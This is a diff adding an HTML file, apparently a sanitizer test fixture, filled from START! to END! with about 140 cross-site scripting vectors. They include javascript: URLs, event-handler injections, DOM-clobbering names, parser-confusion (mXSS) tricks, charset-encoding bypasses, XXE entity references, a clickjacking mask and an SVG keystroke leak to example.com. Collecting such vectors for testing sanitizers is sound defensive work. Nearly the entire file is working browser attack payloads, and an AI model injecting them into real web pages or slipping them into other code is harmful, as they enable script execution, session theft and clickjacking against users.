@@ -1,0 +1,588 @@
+<h1>START!</h1>
+
+<!-- I am ready now, click one of the buttons! -->
+<input type=checkbox checked><input type=checkbox onclick>
+
+<svg><defs><filter id="f1"><feGaussianBlur in="SourceGraphic" stdDeviation="15" /></filter></defs><rect width="90" height="90" stroke="green" stroke-width="3" fill="yellow" filter="url(#f1)" /></svg>
+
+<b href="javascript:alert(3)" title="javascript:alert(3)"></b>
+
+<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div src="data:,345">
+
+<img src=x name=createElement><img src=y id=createElement>
+
+<img src=x name=cookie>
+
+123<a href=' javascript:alert(7)'>I am a dolphin!</a>
+
+123<a href=' javascript:alert(8)'>I am a dolphin too!</a>
+
+123<a href=' javascript:alert(9)'>CLICK</a><a href='&#xA0javascript:alert(9)'>CLICK</a><a href='&#x1680;javascript:alert(9)'>CLICK</a><a href='&#x180E;javascript:alert(9)'>CLICK</a><a href='&#x2000;javascript:alert(9)'>CLICK</a><a href='&#x2001;javascript:alert(9)'>CLICK</a><a href='&#x2002;javascript:alert(9)'>CLICK</a><a href='&#x2003;javascript:alert(9)'>CLICK</a><a href='&#x2004;javascript:alert(9)'>CLICK</a><a href='&#x2005;javascript:alert(9)'>CLICK</a><a href='&#x2006;javascript:alert(9)'>CLICK</a><a href='&#x2006;javascript:alert(9)'>CLICK</a><a href='&#x2007;javascript:alert(9)'>CLICK</a><a href='&#x2008;javascript:alert(9)'>CLICK</a><a href='&#x2009;javascript:alert(9)'>CLICK</a><a href='&#x200A;javascript:alert(9)'>CLICK</a><a href='&#x200B;javascript:alert(9)'>CLICK</a><a href='&#x205f;javascript:alert(9)'>CLICK</a><a href='&#x3000;javascript:alert(9)'>CLICK</a>
+
+<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>
+
+<img src='javascript:while(1){}'>
+
+<a href=data:,evilnastystuff>clickme</a>
+
+123456
+
+<form onmouseover='alert(14)'><input name="attributes"><input name="attributes">
+
+<img src=x name=getElementById>
+
+<a href="#some-code-here" id="location">invisible
+
+<div onclick=alert(17)><form onsubmit=alert(17)><input onfocus=alert(17) name=parentNode>123</form></div>
+
+<form onsubmit=alert(18)><input onfocus=alert(18) name=nodeName>123</form>
+
+<form onsubmit=alert(19)><input onfocus=alert(19) name=nodeType>123</form>
+
+<form onsubmit=alert(20)><input onfocus=alert(20) name=children>123</form>
+
+<form onsubmit=alert(21)><input onfocus=alert(21) name=attributes>123</form>
+
+<form onsubmit=alert(22)><input onfocus=alert(22) name=removeChild>123</form>
+
+<form onsubmit=alert(23)><input onfocus=alert(23) name=removeAttributeNode>123</form>
+
+<form onsubmit=alert(24)><input onfocus=alert(24) name=setAttribute>123</form>
+
+<style>*{color: red}</style>
+
+<p>hello</p>
+
+<listing>&lt;img onerror="alert(27);//" src=x&gt;<t t></listing>
+
+<img src=x id/=' onerror=alert(28)//'>
+
+<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(29)>-->
+
+<b><noscript><!-- </noscript><img src=x onerror=alert(30) --></noscript>
+
+<b><noscript><a alt="</noscript><img src=x onerror=alert(31)>"></noscript>
+
+<body><template><s><template><s><img src=x onerror=alert(32)>@shafigullin</s></template></s></template>
+
+<a href="javascript:alert(33)">@shafigullin<a>
+
+<option><style></option></select><b><img src=x onerror=alert(34)></style></option>
+
+<option><iframe></select><b><script>alert(35)</script>
+
+</iframe></option>
+
+<b><style><style/><img src=x onerror=alert(37)>
+
+<b><style><style////><img src=x onerror=alert(38)></style>
+
+<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
+  <mrow>
+    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>
+    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
+    <menclose notation="box" mathcolor="#FF0000"><mi>a</mi></menclose><mo>,</mo>
+    <menclose notation="box" mathbackground="#80FF80"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
+    <menclose notation="box" mathcolor="#FF0000" mathbackground="#80FF80"><mi>a</mi></menclose><mo>,</mo>
+    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>
+  </mrow>
+</math>
+
+<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(40)>
+
+<a href="javascript:alert(41)">@shafigullin<a>
+
+<image name=activeElement><svg onload=alert(42)>
+
+<image name=body><img src=x><svg onload=alert(43); autofocus>, <keygen onfocus=alert(43); autofocus>
+
+<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>
+
+<button remove=me onmousedown="javascript:alert(45);" onclick="javascript:alert(45)" >@giutro
+
+<a href="javascript:123" onclick="alert(46)">CLICK ME (bypass by @shafigullin)</a>
+
+<isindex x="javascript:" onmouseover="alert(47)" label="variation of bypass by @giutro">
+
+<div wow=removeme onmouseover=alert(48)>text
+
+<input x=javascript: autofocus onfocus=alert(49)><svg id=1 onload=alert(49)></svg>
+
+<isindex src="javascript:" onmouseover="alert(50)" label="bypass by @giutro" />
+
+<a href="javascript:123" onclick="alert(51)">CLICK ME (bypass by @shafigullin)</a>
+
+<form action="javasc
+ript:alert(52)"><button>XXX</button></form>
+
+<div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(53)">X</button>//["'`-->]]>]</div>
+
+<div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'`-->]]>]</div>
+
+<div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&("XSS")&R&UA;&&<&A9&11/script&X&>//["'`-->]]>]</div>
+
+<div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'`-->]]>]</div>
+
+<div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(57)',384,null,'rsa-dual-use')</script>//["'`-->]]>]</div>
+
+<div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'`-->]]>]</div>
+
+<div id="7"><input onfocus=alert(59) autofocus>//["'`-->]]>]</div>
+
+<div id="8"><input onblur=alert(60) autofocus><input autofocus>//["'`-->]]>]</div>
+
+<div id="9"><a style="-o-link:'javascript:alert(61)';-o-link-source:current">X</a>//["'`-->]]>]</div>
+
+<div id="10"><video poster=javascript:alert(62)//></video>//["'`-->]]>]</div>
+
+<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(63)"></g></svg>//["'`-->]]>]</div>
+
+<div id="12"><body onscroll=alert(64)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'`-->]]>]</div>
+
+<div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'`-->]]>]</div>
+
+<div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'`-->]]>]</div>
+
+<div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'`-->]]>]</div>
+
+<div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(68)` >//["'`-->]]>]</div>
+
+<div id="17"><?xml-stylesheet href="javascript:alert(69)"?><root/>//["'`-->]]>]</div>
+
+<div id="18"><script xmlns="http://www.w3.org/1999/xhtml">alert(70)</script>//["'`-->]]>]</div>
+
+<div id="19"><meta charset="x-mac-farsi">¼script ¾alert(71)//¼/script ¾//["'`-->]]>]</div>
+
+<div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(72)}),x</script>//["'`-->]]>]</div>
+
+<div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(73)')()</script>//["'`-->]]>]</div>
+
+<div id="22"><input onblur=focus() autofocus><input>//["'`-->]]>]</div>
+
+<div id="23"><form id=foobar onforminput=alert(75)><input></form><button form=test onformchange=alert(75)>X</button>//["'`-->]]>]</div>
+
+<div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(76)>`>//["'`-->]]>]</div>
+
+<div id="25"><script src="#">{alert(77)}</script>;1//["'`-->]]>]</div>
+
+<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'`-->]]>]</div>
+
+<div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(79)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'`-->]]>]</div><div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(79)>>//["'`-->]]>]</div>
+
+<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(80))%7d//["'`-->]]>]</div>
+
+<div id="30"><style>@import "data:,*%7bx:expression(alert(81))%7D";</style>//["'`-->]]>]</div>
+
+<div id="31"><frameset onload=alert(82)>//["'`-->]]>]</div>
+
+<div id="32"><table background="javascript:alert(83)"></table>//["'`-->]]>]</div>
+
+<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(84);">XXX</a></a><a href="javascript:alert(84)">XXX</a>//["'`-->]]>]</div>
+
+<div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'`-->]]>]</div>
+
+<div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(86) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div>
+
+<div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(87)">XXX</a>//["'`-->]]>]</div>
+
+<div id="37"><!--<img src="--><img src=x onerror=alert(88)//">//["'`-->]]>]</div>
+
+<div id="38"><comment><img src="</comment><img src=x onerror=alert(89)//">//["'`-->]]>]</div><div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
+
+<![><img src="]><img src=x onerror=alert(90)//">
+
+<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
+<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(91)//"></svg>//["'`-->]]>]</div>
+
+<div id="40"><style><img src="</style><img src=x onerror=alert(92)//">//["'`-->]]>]</div>
+
+<div id="41"><li style=list-style:url() onerror=alert(93)></li>
+
+<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(94)></div>//["'`-->]]>]</div>
+
+<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(95)//#">XXX</a></body>//["'`-->]]>]</div>
+
+<div id="43"><?xml version="1.0" standalone="no"?>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<style type="text/css">
+@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
+</style>
+</head>
+<body>Hello</body>
+</html>//["'`-->]]>]</div>
+
+<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div>
+
+<div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div>
+
+<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div>
+
+<div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(101)</script></svg>//["'`-->]]>]</div>
+
+<div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(102)</SCRIPT>//["'`-->]]>]</div>
+
+<div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(103)"></OBJECT>//["'`-->]]>]</div>
+
+<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div>
+
+<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div>
+
+<div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div><div id="53"><xml id="xss" src="test.htc"></xml>
+
+<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
+
+<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div>
+
+<div id="55"><video><source onerror="alert(109)">//["'`-->]]>]</div>
+
+<div id="56"><video onerror="alert(110)"><source></source></video>//["'`-->]]>]</div>
+
+<div id="57"><b <script>alert(111)//</script>0</script></b>//["'`-->]]>]</div>
+
+<div id="58"><b><script<b></b><alert(112)</script </b></b>//["'`-->]]>]</div>
+
+<div id="59"><div id="div1"><input value="``onmouseover=alert(113)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div>
+
+<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
+
+<div id="62"><!-- IE 6-8 -->
+<x '="foo"><x foo='><img src=x onerror=alert(115)//'>
+<!-- IE 6-9 -->
+<! '="foo"><x foo='><img src=x onerror=alert(115)//'>
+<? '="foo"><x foo='><img src=x onerror=alert(115)//'>//["'`-->]]>]</div>
+
+<div id="63"><embed src="javascript:alert(116)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
+<img src="javascript:alert(116)">
+<image src="javascript:alert(116)"> // IE6, O10.10↓, OM10.0↓
+<script src="javascript:alert(116)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
+
+<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div>
+
+<div id="65"><svg onload="javascript:alert(118)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div><div id="66"><?xml version="1.0"?>
+
+<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(119)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
+<root/>//["'`-->]]>]</div>
+<div id="67"><!DOCTYPE x [
+    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"
+ onerror CDATA "alert(119)"
+ onload CDATA "alert(119)">
+]><img />//["'`-->]]>]</div>
+
+<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
+    <html:style /><x xlink:href="javascript:alert(120)" xlink:type="simple">XXX</x>
+</doc>//["'`-->]]>]</div>
+
+<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(121)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div>
+
+<div id="70"><div style=width:1px;filter:glow onfilterchange=alert(122)>x</div>//["'`-->]]>]</div>
+
+<div id="71"><// style=x:expression8alert(123)9>//["'`-->]]>]</div>
+
+<div id="72"><form><button formaction="javascript:alert(124)">X</button>//["'`-->]]>]</div>
+
+<div id="73"><event-source src="event.php" onload="alert(125)">//["'`-->]]>]</div>
+
+<div id="74"><a href="javascript:alert(126)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div>
+
+<div id="75"><script<{alert(127)}/></script </>//["'`-->]]>]</div>
+
+<div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div>
+
+<div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(129))"/>//["'`-->]]>]</div>
+
+<div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div>
+
+<div id="79"><object allowscriptaccess="always" data="x"></object>//["'`-->]]>]</div>
+
+<div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(132))}</style>//["'`-->]]>]</div>
+
+<div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(133)" xlink:type="simple"/>//["'`-->]]>]</div>
+
+<div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div><div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(134)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
+
+<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(135)//#x"/>//["'`-->]]>]</div>
+
+<div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div>
+
+<div id="86"><body oninput=alert(137)><input autofocus>//["'`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(137)"><rect width="1000" height="1000" fill="white"/></a>
+</svg>//["'`-->]]>]</div>
+
+<div id="88"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<animation xlink:href="javascript:alert(138)"/>
+<animation xlink:href="data:text/xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(138)'%3E%3C/svg%3E"/>
+
+<image xlink:href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(139)'%3E%3C/svg%3E"/>
+
+<foreignObject xlink:href="javascript:alert(140)"/>
+<foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3Ealert(140)%3C/script%3E"/>
+
+</svg>//["'`-->]]>]</div>
+
+<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
+<set attributeName="onmouseover" to="alert(142)"/>
+<animate attributeName="onunload" to="alert(142)"/>
+</svg>//["'`-->]]>]</div>
+
+<div id="90"><!-- Up to Opera 10.63 -->
+<div style=content:url(test2.svg)></div>
+
+<!-- Up to Opera 11.64 - see link below -->
+
+<!-- Up to Opera 12.x -->
+<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
+
+<div id="91">[A]
+<? foo="><script>alert(146)</script>">
+<! foo="><script>alert(146)</script>">
+</ foo="><script>alert(146)</script>">
+[B]
+<? foo="><x foo='?><script>alert(146)</script>'>">
+[C]
+<! foo="[[[x]]"><x foo="]foo><script>alert(146)</script>">
+[D]
+<% foo><x foo="%><script>alert(146)</script>">//["'`-->]]>]</div>
+
+<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
+
+<div id="93"><div style="list-style:url(http://foo.f)url(javascript:alert(148));">X</div>//["'`-->]]>]</div>
+
+<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
+<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(149)</handler>
+</svg>//["'`-->]]>]</div>
+
+<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<feImage>
+<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
+</feImage>
+</svg>//["'`-->]]>]</div>
+
+<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
+<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
+
+<div id="97"><!-- IE 5-9 -->
+<div id=d><x xmlns="><iframe onload=alert(152)"></div>
+<script>d.innerHTML+='';</script>
+<!-- IE 10 in IE5-9 Standards mode -->
+<div id=d><x xmlns='"><iframe onload=alert(152)//'></div>
+<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
+
+<div id="98"><div id=d><div style="font-family:'sansFAAFB colorAredB'">X</div></div>
+<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
+
+<div id="99">XXX<style>
+
+*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
+
+<!--
+--><!--*{color:red}   /* all UA */
+
+*{background:url(xx //**/
+ed/*)} /* IE 6-7 Standards mode */
+
+</style>//["'`-->]]>]</div>
+
+<div id="100"><img[a][b]src=x[d]onerror[c]=[e]"alert(159)">//["'`-->]]>]</div>
+
+<div id="101"><a href="[a]java[b]script[c]:alert(160)">XXX</a>//["'`-->]]>]</div>
+
+<div id="102"><img src="x` `<script>alert(161)</script>"` `>//["'`-->]]>]</div>
+
+<div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
+<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(162) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
+</svg>//["'`-->]]>]</div>
+
+<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div>
+
+<div id="106"><img src onerror /" '"= alt=alert(164)//">//["'`-->]]>]</div>
+
+<div id="107"><title onpropertychange=alert(165)></title><title title=></title>//["'`-->]]>]</div>
+
+<div id="108"><!-- IE 5-8 standards mode -->
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx onerror=alert(166)></a>">
+<!-- IE 5-9 standards mode -->
+<!a foo=x=`y><img alt="`><img src=xx onerror=alert(166)//">
+<?a foo=x=`y><img alt="`><img src=xx onerror=alert(166)//">//["'`-->]]>]</div>
+
+<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
+<a id="x"><rect fill="white" width="1000" height="1000"/></a>
+<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
+</svg>//["'`-->]]>]</div>
+
+<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
+<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
+</svg>//["'`-->]]>]</div>
+
+<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
+
+<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="113"><div id="x">XXX</div>
+<style>
+
+#x{font-family:foo[bar;color:green;}
+
+#y];color:red;{}
+
+</style>//["'`-->]]>]</div>
+
+<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div><div id="115"><!--[if]><script>alert(174)</script -->
+<!--[if<img src=x onerror=alert(174)//]> -->//["'`-->]]>]</div>
+
+<div id="116"><div id="x">x</div>
+<xml:namespace prefix="t">
+<import namespace="t" implementation="#default#time2">
+<t:set attributeName="innerHTML" targetElement="x" to="<img
+                                                           src=x
+                                                                onerror
+                                                                       =alert(175)>">//["'`-->]]>]</div>
+
+<div id="117"><a href="http://attacker.org">
+    <iframe src="http://example.org/"></iframe>
+</a>//["'`-->]]>]</div>
+
+<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
+    <h1>Drop me</h1>
+</div>
+<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
+
+<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
+
+<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
+
+<div id="120"><script>
+function makePopups(){
+    for (i=1;i<6;i++) {
+        window.open('popup.html','spam'+i,'width=50,height=50');
+    }
+}
+</script>
+<body>
+<a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
+
+<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
+xmlns:svg="http://www.w3.org/2000/svg">
+<body style="background:gray">
+<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
+<svg:svg>
+<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
+    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
+    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
+</svg:mask>
+</svg:svg>
+</body>
+</html>//["'`-->]]>]</div>
+
+<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
+
+<div id="123"><span class=foo>Some text</span>
+<a class=bar href="http://www.example.org">www.example.org</a>
+<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
+<script>
+$("span.foo").click(function() {
+alert('foo');
+$("a.bar").click();
+});
+$("a.bar").click(function() {
+alert('bar');
+location="http://html5sec.org";
+});
+</script>//["'`-->]]>]</div>
+
+<div id="124"><script src="/example.com
+                                       oo.js"></script> // Safari 5.0, Chrome 9, 10
+<script src="\example.com
+                         oo.js"></script> // Safari 5.0//["'`-->]]>]</div>
+
+<div id="125"><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(185)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
+
+<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
+<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(186)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
+
+<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
+<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
+<handler id="y">alert(187)</handler>
+</svg>//["'`-->]]>]</div>
+
+<div id="128"><svg><style><img/src=x onerror=alert(188)// </b>//["'`-->]]>]</div>
+
+<div id="129"><svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(189)</script></svg>")'>
+<!--
+Same effect with
+<image filter='...'>
+-->
+</svg>//["'`-->]]>]</div>
+
+<div id="130"><math href="javascript:alert(190)">CLICKME</math>
+<math>
+<!-- up to FF 13 -->
+<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(190)">CLICKME</maction>
+
+<!-- FF 14+ -->
+<maction actiontype="statusline" xlink:href="javascript:alert(191)">CLICKME<mtext>http://http://google.com</mtext></maction>
+</math>//["'`-->]]>]</div>
+
+<div id="132"><!doctype html>
+<form>
+<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
+<br>
+<input name="secret" type="password">
+</form>
+<!-- injection --><svg height="50px">
+<image xmlns:xlink="http://www.w3.org/1999/xlink">
+<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
+<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
+<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
+<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
+</image>
+</svg>//["'`-->]]>]</div>
+
+<div id="133"><!-- `<img/src=xxx onerror=alert(193)//--!>//["'`-->]]>]</div>
+
+<div id="134"><xmp>
+<%
+</xmp>
+<img alt='%></xmp><img src=xx onerror=alert(194)//'>
+
+<script>
+x='<%'
+</script> %>/
+alert(195)
+</script>
+
+XXX
+<style>
+*['<!--']{}
+</style>
+-->{}
+*{color:red}</style>//["'`-->]]>]</div>
+
+<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
+<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
+<template match="/">
+<eval>new ActiveXObject('htmlfile').parentWindow.alert(197)</eval>
+<if expr="new ActiveXObject('htmlfile').parentWindow.alert(197)"></if>
+</template>
+</stylesheet>//["'`-->]]>]</div>
+
+<div id="136"><form action="x" method="post">
+<input name="username" value="admin" />
+<input name="password" type="password" value="secret" />
+<input name="injected" value="injected" dirname="password" />
+<input type="submit">
+</form>//["'`-->]]>]</div>
+
+<div id="137"><svg>
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
+<circle r="400"></circle>
+<animate attributeName="xlink:href" begin="0" from="javascript:alert(199)" to="&" />
+</a>//["'`-->]]>]</div>
+
+<img name="bar" id="foo">
+
+<input name=submit>123
+
+<input name=acceptCharset>123
+
+<h1>END!</h1>
